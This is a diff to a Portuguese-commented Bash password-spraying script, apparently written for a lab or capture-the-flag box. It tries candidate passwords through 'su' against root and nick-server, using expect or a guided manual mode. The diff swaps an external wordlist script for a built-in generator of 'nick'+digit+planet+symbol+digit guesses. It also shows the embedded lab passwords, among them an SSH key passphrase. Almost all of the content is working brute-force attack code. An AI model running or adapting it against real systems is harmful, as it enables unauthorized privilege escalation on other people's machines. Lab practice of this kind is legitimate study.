@@ -4,7 +4,7 @@
 #   bash su_password_spray.sh
 #   bash su_password_spray.sh --wordlist /caminho/old-passwds --users "root nick-server"
 #   bash su_password_spray.sh --users "root" --stop-on-hit
-#
+#teste
 # Observacoes:
 # - Com expect: tenta automaticamente.
 # - Sem expect: entra em modo manual guiado (mostra tentativa por tentativa).
@@ -18,14 +18,8 @@ STOP_ON_HIT=0
 TIMEOUT_SECS=5
 MANUAL_MODE=0
 MAX_PASSWORDS=0
-GENERATE_WORDLIST=0
-WORDLIST_GENERATOR=""
 AUTO_GENERATE_ON_FAIL=1
-
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-PROJECT_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
-KNOWN_USER_FILE="${PROJECT_ROOT}/user.txt"
-KNOWN_NICKJ_FILE="${PROJECT_ROOT}/sshnickj.txt"
+GENERATED_WORDLIST_PATH="$(pwd)/wordlist.txt"
 
 # Senhas embutidas (inclui as encontradas no lab):
 # - 424242   (passphrase da key SSH)
@@ -75,11 +69,10 @@ KNOWN_NICKJ_PASSWORDS=(
 usage() {
   cat <<'EOF'
 Uso:
-  su_password_spray.sh [--wordlist <arquivo>] [--generate-wordlist] [--users "root nick-server"] [--stop-on-hit] [--timeout 5] [--manual] [--max-passwords 200] [--no-auto-generate]
+  su_password_spray.sh [--users "root nick-server"] [--stop-on-hit] [--timeout 5] [--manual] [--max-passwords 200] [--no-auto-generate] [--wordlist <arquivo>]
 
 Opcoes:
-  --wordlist <arquivo>   Arquivo com 1 senha por linha (opcional, soma com embutidas).
-  --generate-wordlist    Executa wordlist.sh para gerar wordlist automaticamente.
+  --wordlist <arquivo>   Arquivo com 1 senha por linha (opcional, soma com embutidas na fase 1).
   --users "u1 u2"        Usuarios alvo separados por espaco (default: "root nick-server").
   --stop-on-hit          Para ao primeiro sucesso.
   --timeout <seg>        Timeout por tentativa (default: 5).
@@ -92,7 +85,6 @@ EOF
 while [[ $# -gt 0 ]]; do
   case "$1" in
     --wordlist) WORDLIST="${2:-}"; shift 2 ;;
-    --generate-wordlist) GENERATE_WORDLIST=1; shift ;;
     --users) USERS="${2:-}"; shift 2 ;;
     --stop-on-hit) STOP_ON_HIT=1; shift ;;
     --timeout) TIMEOUT_SECS="${2:-5}"; shift 2 ;;
@@ -106,32 +98,6 @@ done
 
 if [[ -n "${WORDLIST}" && ! -f "${WORDLIST}" ]]; then
   echo "[!] Arquivo de --wordlist nao existe: ${WORDLIST}" >&2
-  exit 1
-fi
-
-if [[ "${GENERATE_WORDLIST}" -eq 1 ]]; then
-  WORDLIST_GENERATOR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/wordlist.sh"
-  if [[ ! -f "${WORDLIST_GENERATOR}" ]]; then
-    echo "[!] --generate-wordlist ativo, mas nao achei: ${WORDLIST_GENERATOR}" >&2
-    exit 1
-  fi
-  if [[ ! -x "${WORDLIST_GENERATOR}" ]]; then
-    chmod +x "${WORDLIST_GENERATOR}" 2>/dev/null || true
-  fi
-  echo "[*] Gerando wordlist com: ${WORDLIST_GENERATOR}"
-  _old_pwd="$(pwd)"
-  cd "$(dirname "${WORDLIST_GENERATOR}")"
-  bash "./$(basename "${WORDLIST_GENERATOR}")"
-  cd "${_old_pwd}"
-  # Se --wordlist nao foi informado, usa o padrao gerado pelo script.
-  if [[ -z "${WORDLIST}" ]]; then
-    WORDLIST="$(cd "$(dirname "${WORDLIST_GENERATOR}")" && pwd)/wordlist.txt"
-  fi
-  echo "[*] Wordlist gerada: ${WORDLIST}"
-fi
-
-if [[ -n "${WORDLIST}" && ! -f "${WORDLIST}" ]]; then
-  echo "[!] Wordlist final nao encontrada: ${WORDLIST}" >&2
   exit 1
 fi
 
@@ -150,15 +116,26 @@ cleanup() {
 }
 trap cleanup EXIT
 
-# FASE 1: junta conhecidas (embutidas + lista 50-74 + user.txt + sshnickj.txt + wordlist opcional)
+# Gerador interno: cria wordlist no diretorio atual (nao depende de arquivo externo).
+generate_local_wordlist() {
+  local out_file="$1"
+  local planetas=("terra" "saturno" "mercurio" "netuno" "venus" "jupiter" "marte" "urano")
+  local simbolos=("" "!" "@" "#" "$" "%" "-" "*")
+  : > "${out_file}"
+  for i in {0..9}; do
+    for p in "${planetas[@]}"; do
+      for s in "${simbolos[@]}"; do
+        for f in {0..9}; do
+          printf 'nick%s%s%s%s\n' "${i}" "${p}" "${s}" "${f}" >> "${out_file}"
+        done
+      done
+    done
+  done
+}
+
+# FASE 1: junta conhecidas (embutidas + lista 50-74 + wordlist opcional)
 printf '%s\n' "${EMBEDDED_PASSWORDS[@]}" > "${PASS_FILE}"
 printf '%s\n' "${KNOWN_NICKJ_PASSWORDS[@]}" >> "${PASS_FILE}"
-if [[ -f "${KNOWN_USER_FILE}" ]]; then
-  cat "${KNOWN_USER_FILE}" >> "${PASS_FILE}"
-fi
-if [[ -f "${KNOWN_NICKJ_FILE}" ]]; then
-  cat "${KNOWN_NICKJ_FILE}" >> "${PASS_FILE}"
-fi
 if [[ -n "${WORDLIST}" ]]; then
   cat "${WORDLIST}" >> "${PASS_FILE}"
 fi
@@ -176,8 +153,6 @@ if [[ "${MAX_PASSWORDS}" -gt 0 ]]; then
 fi
 
 echo "[*] Wordlist externa: ${WORDLIST:-<nenhuma>}"
-echo "[*] Arquivo user conhecido: ${KNOWN_USER_FILE} ($( [[ -f "${KNOWN_USER_FILE}" ]] && echo ok || echo ausente ))"
-echo "[*] Arquivo sshnickj conhecido: ${KNOWN_NICKJ_FILE} ($( [[ -f "${KNOWN_NICKJ_FILE}" ]] && echo ok || echo ausente ))"
 echo "[*] Senhas embutidas: ${#EMBEDDED_PASSWORDS[@]}"
 echo "[*] Senhas conhecidas 50-74: ${#KNOWN_NICKJ_PASSWORDS[@]}"
 echo "[*] Total fase 1 (conhecidas): $(wc -l < "${PASS_FILE}")"
@@ -235,7 +210,13 @@ manual_guide_file() {
       echo "  su - ${user}"
       echo
       printf "Resultado? [s=sucesso / n=falha / q=sair]: "
-      read -r ans
+      # Importante: em modo manual, o loop le senhas de arquivo.
+      # A resposta do operador deve vir do terminal, nao do arquivo.
+      if [[ -r /dev/tty ]]; then
+        read -r ans < /dev/tty
+      else
+        read -r ans
+      fi
       case "${ans}" in
         s|S)
           echo "[+] HIT user=${user} senha=${password}"
@@ -295,19 +276,10 @@ fi
 # Fase 2: se nenhuma senha funcionou, chama gerador e tenta a wordlist gerada
 if [[ "${hits}" -eq 0 && "${AUTO_GENERATE_ON_FAIL}" -eq 1 ]]; then
   echo
-  echo "[*] Nenhum hit na fase 1. Iniciando fase 2 (gerador)."
-  GENERATE_WORDLIST=1
-  WORDLIST_GENERATOR="${SCRIPT_DIR}/wordlist.sh"
-  if [[ -f "${WORDLIST_GENERATOR}" ]]; then
-    if [[ ! -x "${WORDLIST_GENERATOR}" ]]; then
-      chmod +x "${WORDLIST_GENERATOR}" 2>/dev/null || true
-    fi
-    _old_pwd="$(pwd)"
-    cd "${SCRIPT_DIR}"
-    bash "./$(basename "${WORDLIST_GENERATOR}")"
-    cd "${_old_pwd}"
-    if [[ -f "${SCRIPT_DIR}/wordlist.txt" ]]; then
-      cp "${SCRIPT_DIR}/wordlist.txt" "${GEN_PASS_FILE}"
+  echo "[*] Nenhum hit na fase 1. Iniciando fase 2 (gerador interno)."
+  generate_local_wordlist "${GENERATED_WORDLIST_PATH}"
+  if [[ -f "${GENERATED_WORDLIST_PATH}" ]]; then
+      cp "${GENERATED_WORDLIST_PATH}" "${GEN_PASS_FILE}"
       sed -e 's/\r$//' -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' "${GEN_PASS_FILE}" \
         | sed '/^$/d' \
         | sed '/^#/d' \
@@ -325,11 +297,8 @@ if [[ "${hits}" -eq 0 && "${AUTO_GENERATE_ON_FAIL}" -eq 1 ]]; then
       else
         run_file_expect "${GEN_PASS_FILE}" "2 - gerada"
       fi
-    else
-      echo "[!] wordlist.txt nao foi gerada pelo ${WORDLIST_GENERATOR}"
-    fi
   else
-    echo "[!] Gerador nao encontrado: ${WORDLIST_GENERATOR}"
+    echo "[!] Falha ao gerar ${GENERATED_WORDLIST_PATH}"
   fi
 fi
 
